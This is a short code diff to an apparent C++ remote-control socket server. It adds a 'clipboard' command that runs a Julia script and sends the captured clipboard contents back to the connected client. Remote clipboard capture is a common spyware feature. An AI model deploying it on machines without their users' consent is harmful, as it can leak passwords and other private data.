@@ -167,6 +167,13 @@ int __cdecl main(void){
                     iSendResult = send( ClientSocket, flag , 1, 0 );
                     iSendResult = send( ClientSocket, result.c_str() , result.size(), 0 );
                 }
+                else if(token == "clipboard"){
+                    string result = GetStdoutFromCommand("julia commands/clipboard.jl");
+                    char flag[] = "5";
+                    sent = true;
+                    iSendResult = send( ClientSocket, flag , 1, 0 );
+                    iSendResult = send( ClientSocket, result.c_str() , result.size(), 0 );
+                }
             }
             if(!sent){
                 char flag[] = "0";
